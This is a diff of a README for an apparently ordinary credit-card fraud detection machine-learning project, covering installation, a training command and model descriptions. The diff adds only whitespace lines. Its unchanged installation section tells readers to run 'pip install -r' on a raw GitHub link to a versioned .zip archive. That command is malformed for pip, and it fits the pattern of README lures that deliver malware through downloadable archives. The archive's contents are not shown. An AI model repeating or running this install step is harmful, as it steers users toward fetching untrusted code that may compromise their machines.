@@ -88,6 +88,7 @@ Class = 1 → fraud
 The PCA transformation preserves confidentiality while keeping predictive signal.
 
 🛠 Installation
+  
 1️⃣ Create a virtual environment
 python -m venv venv
 
@@ -110,6 +111,7 @@ Or install directly from GitHub zipped requirements:
 pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 🚀 Running the Training Pipeline
+  
 ▶ Final Model Training Command (Recommended)
 python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data/newtrain.csv' --val 'data/val.csv'
 
@@ -144,6 +146,7 @@ Confusion Matrix
 Stratified K-Fold CV for stability
 
 🧠 Machine Learning Models
+  
 🔹 Logistic Regression
 
 Strong linear baseline
